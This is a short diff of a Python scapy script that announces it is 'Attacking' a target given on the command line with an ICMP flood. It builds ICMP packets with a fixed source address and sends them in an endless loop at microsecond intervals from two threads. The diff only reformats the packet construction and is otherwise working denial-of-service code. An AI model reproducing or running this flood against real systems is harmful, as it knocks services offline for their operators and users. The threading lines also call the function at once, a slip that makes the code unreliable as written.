@@ -6,9 +6,12 @@ target = str(sys.argv[1])
 
 print("Attacking " + target + " with ICMP flood.")
 
+
 def icmp_flood():
-    packet = IP(src = "192.168.32.110", dst = target) / ICMP() / "random_payload"
-    send(packet, loop = 1, inter=0.00001)
+    packet = scapy.IP(src="192.168.32.110", dst=target) / \
+        scapy.ICMP() / "random_payload"
+    send(packet, loop=1, inter=0.00001)
+
 
 t1 = threading.Thread(target=icmp_flood())
 t2 = threading.Thread(target=icmp_flood())
